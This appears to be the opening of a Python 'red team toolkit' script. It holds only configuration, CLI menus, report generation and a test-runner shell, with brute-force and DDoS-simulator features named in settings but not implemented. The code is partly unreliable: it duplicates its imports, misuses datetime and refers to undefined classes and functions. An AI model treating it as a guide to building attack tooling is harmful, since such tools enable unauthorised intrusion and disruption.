#!/usr/bin/env python3
"""
Enhanced Red Team Toolkit v2.8
A comprehensive collection of penetration testing and red team tools.
Version: 2.8.0 - Phase 8 Extensibility & Advanced Features
"""

import base64
import urllib.parse
import urllib
import codecs
import exifread
import socket
import os
import itertools
import re
import ipaddress
import datetime
import threading
import hashlib
import random
import string
import dns.resolver
import dns.reversename
import asyncio
import aiohttp
from threading import Thread
import time
import subprocess
import json
import logging
import configparser
from typing import Optional, List, Set, Dict, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import sys

# Enhanced imports with better error handling
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("⚠️  Warning: requests library not available. Some features will be limited.")

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False
    print("⚠️  Warning: beautifulsoup4 library not available. Web scraping features will be limited.")

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️  Warning: scapy library not available. Network sniffing features will be limited.")

try:
    import flask
    from flask_socketio import SocketIO
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("⚠️  Warning: flask library not available. DDoS simulator features will be limited.")

# Phase 1: Enhanced CLI and Progress Bar imports
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm
    from rich.text import Text
    from rich import print as rprint
    RICH_AVAILABLE = True
except ImportError:
    RICH_AVAILABLE = False
    print("⚠️  Warning: rich library not available. Using basic CLI.")

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False
    print("⚠️  Warning: tqdm library not available. Using basic progress bars.")

# Phase 6: Reporting imports
try:
    import jinja2
    JINJA2_AVAILABLE = True
except ImportError:
    JINJA2_AVAILABLE = False
    print("⚠️  Warning: jinja2 library not available. HTML report generation will be limited.")

try:
    from weasyprint import HTML
    WEASYPRINT_AVAILABLE = True
except (ImportError, OSError) as e:
    WEASYPRINT_AVAILABLE = False
    print("⚠️  Warning: weasyprint library not available. PDF report generation will be limited.")
    print(f"   Error: {e}")
    print("   To install weasyprint on Windows, follow: https://doc.courtbouillon.org/weasyprint/stable/first_steps.html#installation")

try:
    import matplotlib.pyplot as plt
    import matplotlib.patches as mpatches
    MATPLOTLIB_AVAILABLE = True
except ImportError:
    MATPLOTLIB_AVAILABLE = False
    print("⚠️  Warning: matplotlib library not available. Graph generation will be limited.")

try:
    import pandas as pd
    PANDAS_AVAILABLE = True
except ImportError:
    PANDAS_AVAILABLE = False
    print("⚠️  Warning: pandas library not available. Data analysis for reports will be limited.")

# Phase 7: Testing & Quality Assurance imports
try:
    import unittest
    import unittest.mock
    import tempfile
    import shutil
    import signal
    import sys
    import traceback
    from contextlib import contextmanager
    from io import StringIO
    TESTING_AVAILABLE = True
except ImportError:
    TESTING_AVAILABLE = False
    print("⚠️  Warning: testing libraries not available. Quality assurance features will be limited.")

# Phase 8: Extensibility & Advanced Features imports
try:
    import importlib.util
    import importlib.machinery
    import schedule
    import atexit
    import signal
    import psutil
    import platform
    from datetime import datetime, timedelta
    from typing import Callable, Union, Optional
    EXTENSIBILITY_AVAILABLE = True
except ImportError:
    EXTENSIBILITY_AVAILABLE = False
    print("⚠️  Warning: extensibility libraries not available. Plugin system and scheduler features will be limited.")

import base64
import urllib.parse
import urllib
import codecs
import exifread
import socket
import os
import itertools
import re
import ipaddress
import datetime
import threading
import hashlib
import random
import string
import dns.resolver
import dns.reversename
import asyncio
import aiohttp
from threading import Thread
import time
import subprocess
import json
import logging
import configparser
from typing import Optional, List, Set, Dict, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import sys

# Enhanced imports with better error handling
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    print("⚠️  Warning: requests library not available. Some features will be limited.")

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False
    print("⚠️  Warning: beautifulsoup4 library not available. Web scraping features will be limited.")

try:
    import scapy.all as scapy
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("⚠️  Warning: scapy library not available. Network sniffing features will be limited.")

try:
    import flask
    from flask_socketio import SocketIO
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("⚠️  Warning: flask library not available. DDoS simulator features will be limited.")

# Phase 1: Enhanced Configuration Management
class Config:
    """Enhanced configuration management for the toolkit."""
    
    def __init__(self):
        self.config_file = Path("toolkit_config.ini")
        self.default_config = {
            'DEFAULT': {
                'max_threads': '50',
                'default_timeout': '5',
                'log_level': 'INFO',
                'save_reports': 'true',
                'report_directory': 'reports',
                'rate_limit': '100',
                'enable_colors': 'true',
                'enable_rich_cli': 'true',
                'enable_progress_bars': 'true',
                'auto_save_config': 'true'
            },
            'SCANNING': {
                'port_scan_timeout': '3',
                'banner_grab_timeout': '5',
                'dns_timeout': '10',
                'max_ports_per_scan': '1000',
                'scan_verbosity': 'normal'
            },
            'SECURITY': {
                'max_brute_force_attempts': '10000',
                'max_ddos_clients': '100',
                'max_ddos_duration': '60',
                'enable_destructive_tools': 'false',
                'require_confirmation': 'true'
            },
            'LOGGING': {
                'log_level': 'INFO',
                'log_file': 'reports/toolkit.log',
                'log_format': '%(asctime)s - %(levelname)s - %(message)s',
                'max_log_size': '10MB',
                'backup_count': '5'
            },
            'CLI': {
                'show_banner': 'true',
                'show_tool_descriptions': 'true',
                'enable_keyboard_shortcuts': 'true',
                'confirm_exit': 'true',
                'auto_clear_screen': 'false'
            }
        }
        self.load_config()
    
    def load_config(self):
        """Load configuration from file or create default."""
        self.config = configparser.ConfigParser()
        
        if self.config_file.exists():
            try:
                self.config.read(self.config_file)
                print(f"✓ Configuration loaded from {self.config_file}")
            except Exception as e:
                print(f"⚠️  Error loading config: {e}. Using defaults.")
                self.create_default_config()
        else:
            self.create_default_config()
    
    def create_default_config(self):
        """Create default configuration file."""
        self.config = configparser.ConfigParser()
        for section, options in self.default_config.items():
            self.config[section] = options
        
        try:
            with open(self.config_file, 'w') as f:
                self.config.write(f)
            print(f"✓ Default configuration created: {self.config_file}")
        except Exception as e:
            print(f"⚠️  Could not create config file: {e}")
    
    def get(self, section: str, option: str, fallback: Any = None) -> Any:
        """Get configuration value."""
        try:
            return self.config.get(section, option, fallback=fallback)
        except:
            return fallback
    
    def getint(self, section: str, option: str, fallback: int = 0) -> int:
        """Get integer configuration value."""
        try:
            return self.config.getint(section, option, fallback=fallback)
        except:
            return fallback
    
    def getboolean(self, section: str, option: str, fallback: bool = False) -> bool:
        """Get boolean configuration value."""
        try:
            return self.config.getboolean(section, option, fallback=fallback)
        except:
            return fallback

# Initialize configuration
config = Config()

# Phase 1: Enhanced CLI Management
class CLIManager:
    """Enhanced CLI management with Rich support."""
    
    def __init__(self):
        self.console = Console() if RICH_AVAILABLE else None
        self.enable_rich = config.getboolean('DEFAULT', 'enable_rich_cli', True) and RICH_AVAILABLE
        self.show_descriptions = config.getboolean('CLI', 'show_tool_descriptions', True)
        self.enable_shortcuts = config.getboolean('CLI', 'enable_keyboard_shortcuts', True)
        self.confirm_exit = config.getboolean('CLI', 'confirm_exit', True)
    
    def print_banner(self):
        """Display toolkit banner."""
        if self.enable_rich and config.getboolean('CLI', 'show_banner', True):
            banner_text = """
╔══════════════════════════════════════════════════════════════╗
                                ║                Enhanced Red Team Toolkit v2.8                ║
                                  ║                Phase 8 - Extensibility & Advanced Features                ║
║                                                              ║
║  A comprehensive collection of penetration testing tools     ║
║  for educational and authorized security testing purposes    ║
╚══════════════════════════════════════════════════════════════╝
            """
            self.console.print(Panel(banner_text, style="bold blue"))
        else:
            print("=" * 60)
            print("Enhanced Red Team Toolkit v2.8 - Phase 8 Extensibility & Advanced Features")
            print("=" * 60)
    
    def print_menu(self, tools):
        """Display enhanced menu with descriptions."""
        if self.enable_rich:
            table = Table(title="Available Tools", show_header=True, header_style="bold magenta")
            table.add_column("Option", style="cyan", no_wrap=True)
            table.add_column("Tool Name", style="green")
            table.add_column("Description", style="white")
            
            for option, name, description in tools:
                table.add_row(str(option), name, description)
            
            self.console.print(table)
            
            if self.enable_shortcuts:
                self.console.print("\n[bold yellow]Keyboard Shortcuts:[/bold yellow]")
                self.console.print("  [cyan]0[/cyan] = Exit  |  [cyan]Ctrl+C[/cyan] = Abort  |  [cyan]h[/cyan] = Help")
        else:
            print("\nAvailable Tools:")
            for option, name, description in tools:
                print(f"{option:2}. {name}")
                if self.show_descriptions:
                    print(f"    {description}")
            print("\n0. Exit")
            if self.enable_shortcuts:
                print("Keyboard Shortcuts: 0 = Exit, Ctrl+C = Abort")
    
    def get_choice(self, prompt="Select a tool"):
        """Get user choice with enhanced input handling."""
        try:
            if self.enable_rich:
                choice = Prompt.ask(f"[cyan]{prompt}[/cyan]")
            else:
                choice = input(f"{prompt}: ").strip()
            
            # Handle keyboard shortcuts
            if choice.lower() in ['q', 'quit', 'exit']:
                return "0"
            elif choice.lower() in ['h', 'help']:
                self.show_help()
                return None
            
            return choice
        except KeyboardInterrupt:
            print("\n⚠️  Operation cancelled by user.")
            return None
    
    def show_help(self):
        """Display help information."""
        help_text = """
[bold]Enhanced Red Team Toolkit v2.8 Help[/bold]

[bold]Navigation:[/bold]
• Use number keys to select tools
• 0 or 'q' to exit
• Ctrl+C to abort operations
• 'h' for help

[bold]Features:[/bold]
• Enhanced CLI with Rich support
• Configuration management
• Comprehensive logging
• Progress tracking
• Rate limiting
• Automatic reporting

[bold]Safety:[/bold]
• Educational use only
• Authorized testing only
• Built-in safety features
• Rate limiting protection
        """
        if self.enable_rich:
            self.console.print(Panel(help_text, title="Help", style="bold green"))
        else:
            print(help_text)
    
    def confirm_action(self, message):
        """Get user confirmation for actions."""
        if self.enable_rich:
            return Confirm.ask(f"[yellow]{message}[/yellow]")
        else:
            response = input(f"{message} (y/n): ").lower()
            return response in ['y', 'yes']

# Initialize CLI manager
cli_manager = CLIManager()

# Phase 6: Enhanced Reporting System
class ReportManager:
    """Comprehensive reporting system for the toolkit."""
    
    def __init__(self):
        self.reports_dir = Path(config.get('DEFAULT', 'report_directory', 'reports'))
        self.reports_dir.mkdir(exist_ok=True)
        self.current_session = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        self.session_dir = self.reports_dir / f"session_{self.current_session}"
        self.session_dir.mkdir(exist_ok=True)
        self.tool_reports = {}
        self.session_data = {
            'start_time': datetime.datetime.now().isoformat(),
            'tools_used': [],
            'total_findings': 0,
            'errors': [],
            'warnings': []
        }
    
    def start_tool_report(self, tool_name: str, target: str = None) -> str:
        """Start a new tool report and return the report ID."""
        report_id = f"{tool_name}_{datetime.datetime.now().strftime('%H%M%S')}"
        self.tool_reports[report_id] = {
            'tool_name': tool_name,
            'target': target,
            'start_time': datetime.datetime.now().isoformat(),
            'findings': [],
            'errors': [],
            'warnings': [],
            'data': {}
        }
        self.session_data['tools_used'].append(tool_name)
        logger.info(f"Started report for {tool_name} - {report_id}")
        return report_id
    
    def add_finding(self, report_id: str, finding_type: str, description: str, severity: str = "INFO", data: dict = None):
        """Add a finding to a tool report."""
        if report_id in self.tool_reports:
            finding = {
                'timestamp': datetime.datetime.now().isoformat(),
                'type': finding_type,
                'description': description,
                'severity': severity,
                'data': data or {}
            }
            self.tool_reports[report_id]['findings'].append(finding)
            self.session_data['total_findings'] += 1
            
            # Log based on severity
            if severity == "ERROR":
                logger.error(f"[{report_id}] {description}")
            elif severity == "WARNING":
                logger.warning(f"[{report_id}] {description}")
            else:
                logger.info(f"[{report_id}] {description}")
    
    def add_error(self, report_id: str, error: str, details: str = None):
        """Add an error to a tool report."""
        if report_id in self.tool_reports:
            error_entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'error': error,
                'details': details
            }
            self.tool_reports[report_id]['errors'].append(error_entry)
            self.session_data['errors'].append(f"{report_id}: {error}")
            logger.error(f"[{report_id}] Error: {error}")
    
    def add_warning(self, report_id: str, warning: str, details: str = None):
        """Add a warning to a tool report."""
        if report_id in self.tool_reports:
            warning_entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'warning': warning,
                'details': details
            }
            self.tool_reports[report_id]['warnings'].append(warning_entry)
            self.session_data['warnings'].append(f"{report_id}: {warning}")
            logger.warning(f"[{report_id}] Warning: {warning}")
    
    def save_tool_report(self, report_id: str, format: str = "txt") -> str:
        """Save a tool report to file."""
        if report_id not in self.tool_reports:
            return None
        
        report = self.tool_reports[report_id]
        report['end_time'] = datetime.datetime.now().isoformat()
        
        if format == "txt":
            return self._save_txt_report(report_id, report)
        elif format == "json":
            return self._save_json_report(report_id, report)
        elif format == "html":
            return self._save_html_report(report_id, report)
        elif format == "pdf":
            return self._save_pdf_report(report_id, report)
        
        return None
    
    def _save_txt_report(self, report_id: str, report: dict) -> str:
        """Save report as text file."""
        filename = self.session_dir / f"{report_id}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"Red Team Toolkit Report\n")
            f.write(f"Tool: {report['tool_name']}\n")
            f.write(f"Target: {report.get('target', 'N/A')}\n")
            f.write(f"Start Time: {report['start_time']}\n")
            f.write(f"End Time: {report['end_time']}\n")
            f.write("=" * 60 + "\n\n")
            
            # Findings
            if report['findings']:
                f.write("FINDINGS:\n")
                f.write("-" * 20 + "\n")
                for finding in report['findings']:
                    f.write(f"[{finding['severity']}] {finding['timestamp']}\n")
                    f.write(f"Type: {finding['type']}\n")
                    f.write(f"Description: {finding['description']}\n")
                    if finding['data']:
                        f.write(f"Data: {json.dumps(finding['data'], indent=2)}\n")
                    f.write("\n")
            
            # Errors
            if report['errors']:
                f.write("ERRORS:\n")
                f.write("-" * 20 + "\n")
                for error in report['errors']:
                    f.write(f"[{error['timestamp']}] {error['error']}\n")
                    if error['details']:
                        f.write(f"Details: {error['details']}\n")
                    f.write("\n")
            
            # Warnings
            if report['warnings']:
                f.write("WARNINGS:\n")
                f.write("-" * 20 + "\n")
                for warning in report['warnings']:
                    f.write(f"[{warning['timestamp']}] {warning['warning']}\n")
                    if warning['details']:
                        f.write(f"Details: {warning['details']}\n")
                    f.write("\n")
        
        logger.info(f"Saved text report: {filename}")
        return str(filename)
    
    def _save_json_report(self, report_id: str, report: dict) -> str:
        """Save report as JSON file."""
        filename = self.session_dir / f"{report_id}.json"
        
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Saved JSON report: {filename}")
        return str(filename)
    
    def _save_html_report(self, report_id: str, report: dict) -> str:
        """Save report as HTML file."""
        if not JINJA2_AVAILABLE:
            logger.warning("Jinja2 not available, falling back to text report")
            return self._save_txt_report(report_id, report)
        
        filename = self.session_dir / f"{report_id}.html"
        
        # HTML template
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Red Team Toolkit Report - {{ report.tool_name }}</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
        .section { margin: 20px 0; padding: 15px; border-left: 4px solid #667eea; background: #f8f9fa; }
        .finding { margin: 10px 0; padding: 10px; border-radius: 5px; }
        .finding.ERROR { background: #ffe6e6; border-left: 4px solid #dc3545; }
        .finding.WARNING { background: #fff3cd; border-left: 4px solid #ffc107; }
        .finding.INFO { background: #d1ecf1; border-left: 4px solid #17a2b8; }
        .finding.SUCCESS { background: #d4edda; border-left: 4px solid #28a745; }
        .error { background: #ffe6e6; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #dc3545; }
        .warning { background: #fff3cd; padding: 10px; margin: 5px 0; border-radius: 5px; border-left: 4px solid #ffc107; }
        .data { background: #f8f9fa; padding: 10px; margin: 5px 0; border-radius: 5px; font-family: monospace; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { padding: 8px; text-align: left; border-bottom: 1px solid #ddd; }
        th { background-color: #667eea; color: white; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Red Team Toolkit Report</h1>
            <h2>{{ report.tool_name }}</h2>
            <p>Generated on {{ report.end_time }}</p>
        </div>
        
        <div class="section">
            <h3>Report Summary</h3>
            <table>
                <tr><th>Tool</th><td>{{ report.tool_name }}</td></tr>
                <tr><th>Target</th><td>{{ report.target or 'N/A' }}</td></tr>
                <tr><th>Start Time</th><td>{{ report.start_time }}</td></tr>
                <tr><th>End Time</th><td>{{ report.end_time }}</td></tr>
                <tr><th>Findings</th><td>{{ report.findings|length }}</td></tr>
                <tr><th>Errors</th><td>{{ report.errors|length }}</td></tr>
                <tr><th>Warnings</th><td>{{ report.warnings|length }}</td></tr>
            </table>
        </div>
        
        {% if report.findings %}
        <div class="section">
            <h3>Findings</h3>
            {% for finding in report.findings %}
            <div class="finding {{ finding.severity }}">
                <strong>[{{ finding.severity }}] {{ finding.timestamp }}</strong><br>
                <strong>Type:</strong> {{ finding.type }}<br>
                <strong>Description:</strong> {{ finding.description }}<br>
                {% if finding.data %}
                <div class="data">
                    <strong>Data:</strong><br>
                    <pre>{{ finding.data|tojson(indent=2) }}</pre>
                </div>
                {% endif %}
            </div>
            {% endfor %}
        </div>
        {% endif %}
        
        {% if report.errors %}
        <div class="section">
            <h3>Errors</h3>
            {% for error in report.errors %}
            <div class="error">
                <strong>{{ error.timestamp }}</strong><br>
                {{ error.error }}<br>
                {% if error.details %}
                <strong>Details:</strong> {{ error.details }}
                {% endif %}
            </div>
            {% endfor %}
        </div>
        {% endif %}
        
        {% if report.warnings %}
        <div class="section">
            <h3>Warnings</h3>
            {% for warning in report.warnings %}
            <div class="warning">
                <strong>{{ warning.timestamp }}</strong><br>
                {{ warning.warning }}<br>
                {% if warning.details %}
                <strong>Details:</strong> {{ warning.details }}
                {% endif %}
            </div>
            {% endfor %}
        </div>
        {% endif %}
    </div>
</body>
</html>
        """
        
        try:
            template = jinja2.Template(html_template)
            html_content = template.render(report=report)
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            logger.info(f"Saved HTML report: {filename}")
            return str(filename)
        except Exception as e:
            logger.error(f"Error generating HTML report: {e}")
            return self._save_txt_report(report_id, report)
    
    def _save_pdf_report(self, report_id: str, report: dict) -> str:
        """Save report as PDF file."""
        if not WEASYPRINT_AVAILABLE:
            logger.warning("WeasyPrint not available, falling back to HTML report")
            return self._save_html_report(report_id, report)
        
        # First generate HTML
        html_file = self._save_html_report(report_id, report)
        if not html_file:
            return None
        
        # Convert to PDF
        pdf_filename = self.session_dir / f"{report_id}.pdf"
        
        try:
            HTML(filename=html_file).write_pdf(pdf_filename)
            logger.info(f"Saved PDF report: {pdf_filename}")
            return str(pdf_filename)
        except Exception as e:
            logger.error(f"Error generating PDF report: {e}")
            return html_file
    
    def generate_session_summary(self) -> str:
        """Generate a comprehensive session summary report."""
        self.session_data['end_time'] = datetime.datetime.now().isoformat()
        self.session_data['duration'] = (
            datetime.fromisoformat(self.session_data['end_time']) - 
            datetime.fromisoformat(self.session_data['start_time'])
        ).total_seconds()
        
        summary_file = self.session_dir / "session_summary.txt"
        
        with open(summary_file, 'w', encoding='utf-8') as f:
            f.write(f"Red Team Toolkit Session Summary\n")
            f.write(f"Session ID: {self.current_session}\n")
            f.write(f"Start Time: {self.session_data['start_time']}\n")
            f.write(f"End Time: {self.session_data['end_time']}\n")
            f.write(f"Duration: {self.session_data['duration']:.2f} seconds\n")
            f.write("=" * 60 + "\n\n")
            
            f.write(f"Tools Used: {len(self.session_data['tools_used'])}\n")
            f.write("-" * 20 + "\n")
            for tool in self.session_data['tools_used']:
                f.write(f"• {tool}\n")
            f.write("\n")
            
            f.write(f"Total Findings: {self.session_data['total_findings']}\n")
            f.write(f"Total Errors: {len(self.session_data['errors'])}\n")
            f.write(f"Total Warnings: {len(self.session_data['warnings'])}\n")
            f.write("\n")
            
            if self.session_data['errors']:
                f.write("Session Errors:\n")
                f.write("-" * 20 + "\n")
                for error in self.session_data['errors']:
                    f.write(f"• {error}\n")
                f.write("\n")
            
            if self.session_data['warnings']:
                f.write("Session Warnings:\n")
                f.write("-" * 20 + "\n")
                for warning in self.session_data['warnings']:
                    f.write(f"• {warning}\n")
                f.write("\n")
        
        logger.info(f"Generated session summary: {summary_file}")
        return str(summary_file)
    
    def generate_graphs(self, data: dict, graph_type: str = "ports") -> str:
        """Generate graphs for network scan data."""
        if not MATPLOTLIB_AVAILABLE or not PANDAS_AVAILABLE:
            logger.warning("Matplotlib or Pandas not available, skipping graph generation")
            return None
        
        try:
            if graph_type == "ports":
                return self._generate_port_graphs(data)
            elif graph_type == "services":
                return self._generate_service_graphs(data)
            elif graph_type == "timeline":
                return self._generate_timeline_graphs(data)
            else:
                logger.warning(f"Unknown graph type: {graph_type}")
                return None
        except Exception as e:
            logger.error(f"Error generating graphs: {e}")
            return None
    
    def _generate_port_graphs(self, data: dict) -> str:
        """Generate port scan graphs."""
        if 'port_scan_results' not in data:
            return None
        
        results = data['port_scan_results']
        if not results:
            return None
        
        # Create figure with subplots
        fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(15, 6))
        
        # Port status distribution
        status_counts = {}
        for host, ports in results.items():
            for port, status in ports.items():
                status_counts[status] = status_counts.get(status, 0) + 1
        
        if status_counts:
            ax1.pie(status_counts.values(), labels=status_counts.keys(), autopct='%1.1f%%')
            ax1.set_title('Port Status Distribution')
        
        # Top open ports
        port_counts = {}
        for host, ports in results.items():
            for port, status in ports.items():
                if status == 'open':
                    port_counts[port] = port_counts.get(port, 0) + 1
        
        if port_counts:
            top_ports = sorted(port_counts.items(), key=lambda x: x[1], reverse=True)[:10]
            ports, counts = zip(*top_ports)
            ax2.bar(ports, counts)
            ax2.set_title('Top 10 Open Ports')
            ax2.set_xlabel('Port')
            ax2.set_ylabel('Count')
            plt.xticks(rotation=45)
        
        plt.tight_layout()
        
        # Save graph
        graph_file = self.session_dir / "port_scan_graphs.png"
        plt.savefig(graph_file, dpi=300, bbox_inches='tight')
        plt.close()
        
        logger.info(f"Generated port scan graphs: {graph_file}")
        return str(graph_file)
    
    def _generate_service_graphs(self, data: dict) -> str:
        """Generate service distribution graphs."""
        if 'service_results' not in data:
            return None
        
        services = data['service_results']
        if not services:
            return None
        
        # Count services
        service_counts = {}
        for service in services.values():
            service_counts[service] = service_counts.get(service, 0) + 1
        
        if not service_counts:
            return None
        
        # Create pie chart
        plt.figure(figsize=(10, 8))
        plt.pie(service_counts.values(), labels=service_counts.keys(), autopct='%1.1f%%')
        plt.title('Service Distribution')
        
        # Save graph
        graph_file = self.session_dir / "service_distribution.png"
        plt.savefig(graph_file, dpi=300, bbox_inches='tight')
        plt.close()
        
        logger.info(f"Generated service distribution graph: {graph_file}")
        return str(graph_file)
    
    def _generate_timeline_graphs(self, data: dict) -> str:
        """Generate timeline graphs for findings."""
        if 'findings_timeline' not in data:
            return None
        
        timeline = data['findings_timeline']
        if not timeline:
            return None
        
        # Convert to pandas DataFrame
        df = pd.DataFrame(timeline)
        df['timestamp'] = pd.to_datetime(df['timestamp'])
        
        # Group by hour and count findings
        hourly_counts = df.groupby(df['timestamp'].dt.hour).size()
        
        plt.figure(figsize=(12, 6))
        hourly_counts.plot(kind='bar')
        plt.title('Findings Timeline (Hourly)')
        plt.xlabel('Hour')
        plt.ylabel('Number of Findings')
        plt.xticks(rotation=45)
        
        # Save graph
        graph_file = self.session_dir / "findings_timeline.png"
        plt.savefig(graph_file, dpi=300, bbox_inches='tight')
        plt.close()
        
        logger.info(f"Generated timeline graph: {graph_file}")
        return str(graph_file)

# Initialize report manager
report_manager = ReportManager()

# Phase 7: Quality Assurance & Testing System
class QualityAssurance:
    """Comprehensive quality assurance and testing system for the toolkit."""
    
    def __init__(self):
        self.test_results = {
            'unit_tests': {'passed': 0, 'failed': 0, 'errors': []},
            'integration_tests': {'passed': 0, 'failed': 0, 'errors': []},
            'validation_tests': {'passed': 0, 'failed': 0, 'errors': []},
            'safety_tests': {'passed': 0, 'failed': 0, 'errors': []}
        }
        self.test_suite = None
        self.safe_mode = True
        self.destructive_operations_disabled = True
    
    def run_comprehensive_tests(self) -> dict:
        """Run all test suites and return comprehensive results."""
        if not TESTING_AVAILABLE:
            logger.warning("Testing libraries not available. Skipping comprehensive tests.")
            return self.test_results
        
        logger.info("Starting comprehensive quality assurance testing...")
        
        # Run all test categories
        self._run_unit_tests()
        self._run_integration_tests()
        self._run_validation_tests()
        self._run_safety_tests()
        
        # Generate test summary
        summary = self._generate_test_summary()
        logger.info(f"Quality assurance testing completed: {summary}")
        
        return self.test_results
    
    def _run_unit_tests(self):
        """Run unit tests for individual modules and functions."""
        logger.info("Running unit tests...")
        
        try:
            # Create test suite
            loader = unittest.TestLoader()
            suite = unittest.TestSuite()
            
            # Add unit test classes
            suite.addTests(loader.loadTestsFromTestCase(TestValidationFunctions))
            suite.addTests(loader.loadTestsFromTestCase(TestUtilityFunctions))
            suite.addTests(loader.loadTestsFromTestCase(TestConfigurationManagement))
            suite.addTests(loader.loadTestsFromTestCase(TestFileOperations))
            suite.addTests(loader.loadTestsFromTestCase(TestNetworkFunctions))
            suite.addTests(loader.loadTestsFromTestCase(TestSecurityFunctions))
            
            # Run tests
            runner = unittest.TextTestRunner(verbosity=2, stream=StringIO())
            result = runner.run(suite)
            
            # Record results
            self.test_results['unit_tests']['passed'] = result.testsRun - len(result.failures) - len(result.errors)
            self.test_results['unit_tests']['failed'] = len(result.failures) + len(result.errors)
            self.test_results['unit_tests']['errors'] = [str(failure) for failure in result.failures + result.errors]
            
        except Exception as e:
            logger.error(f"Error running unit tests: {e}")
            self.test_results['unit_tests']['errors'].append(str(e))
    
    def _run_integration_tests(self):
        """Run integration tests for end-to-end workflows."""
        logger.info("Running integration tests...")
        
        try:
            # Create test suite
            loader = unittest.TestLoader()
            suite = unittest.TestSuite()
            
            # Add integration test classes
            suite.addTests(loader.loadTestsFromTestCase(TestPortScannerIntegration))
            suite.addTests(loader.loadTestsFromTestCase(TestWebToolsIntegration))
            suite.addTests(loader.loadTestsFromTestCase(TestFileAnalysisIntegration))
            suite.addTests(loader.loadTestsFromTestCase(TestReportingIntegration))
            
            # Run tests
            runner = unittest.TextTestRunner(verbosity=2, stream=StringIO())
            result = runner.run(suite)
            
            # Record results
            self.test_results['integration_tests']['passed'] = result.testsRun - len(result.failures) - len(result.errors)
            self.test_results['integration_tests']['failed'] = len(result.failures) + len(result.errors)
            self.test_results['integration_tests']['errors'] = [str(failure) for failure in result.failures + result.errors]
            
        except Exception as e:
            logger.error(f"Error running integration tests: {e}")
            self.test_results['integration_tests']['errors'].append(str(e))
    
    def _run_validation_tests(self):
        """Run validation tests for input handling and data integrity."""
        logger.info("Running validation tests...")
        
        try:
            # Create test suite
            loader = unittest.TestLoader()
            suite = unittest.TestSuite()
            
            # Add validation test classes
            suite.addTests(loader.loadTestsFromTestCase(TestInputValidation))
            suite.addTests(loader.loadTestsFromTestCase(TestDataIntegrity))
            suite.addTests(loader.loadTestsFromTestCase(TestErrorHandling))
            
            # Run tests
            runner = unittest.TextTestRunner(verbosity=2, stream=StringIO())
            result = runner.run(suite)
            
            # Record results
            self.test_results['validation_tests']['passed'] = result.testsRun - len(result.failures) - len(result.errors)
            self.test_results['validation_tests']['failed'] = len(result.failures) + len(result.errors)
            self.test_results['validation_tests']['errors'] = [str(failure) for failure in result.failures + result.errors]
            
        except Exception as e:
            logger.error(f"Error running validation tests: {e}")
            self.test_results['validation_tests']['errors'].append(str(e))
    
    def _run_safety_tests(self):
        """Run safety tests for destructive operations and security measures."""
        logger.info("Running safety tests...")
        
        try:
            # Create test suite
            loader = unittest.TestLoader()
            suite = unittest.TestSuite()
            
            # Add safety test classes
            suite.addTests(loader.loadTestsFromTestCase(TestSafetyMeasures))
            suite.addTests(loader.loadTestsFromTestCase(TestDestructiveOperations))
            suite.addTests(loader.loadTestsFromTestCase(TestRateLimiting))
            
            # Run tests
            runner = unittest.TextTestRunner(verbosity=2, stream=StringIO())
            result = runner.run(suite)
            
            # Record results
            self.test_results['safety_tests']['passed'] = result.testsRun - len(result.failures) - len(result.errors)
            self.test_results['safety_tests']['failed'] = len(result.failures) + len(result.errors)
            self.test_results['safety_tests']['errors'] = [str(failure) for failure in result.failures + result.errors]
            
        except Exception as e:
            logger.error(f"Error running safety tests: {e}")
            self.test_results['safety_tests']['errors'].append(str(e))
    
    def _generate_test_summary(self) -> str:
        """Generate a summary of test results."""
        total_passed = sum(category['passed'] for category in self.test_results.values())
        total_failed = sum(category['failed'] for category in self.test_results.values())
        total_tests = total_passed + total_failed
        
        if total_tests == 0:
            return "No tests executed"
        
        success_rate = (total_passed / total_tests) * 100
        return f"{total_passed}/{total_tests} tests passed ({success_rate:.1f}% success rate)"
    
    def enable_safe_mode(self):
        """Enable safe mode with additional safety measures."""
        self.safe_mode = True
        self.destructive_operations_disabled = True
        logger.info("Safe mode enabled - destructive operations disabled")
    
    def disable_safe_mode(self):
        """Disable safe mode (requires explicit confirmation)."""
        if not safe_confirm("Are you sure you want to disable safe mode? This may allow destructive operations."):
            logger.info("Safe mode remains enabled")
            return
        
        self.safe_mode = False
        self.destructive_operations_disabled = False
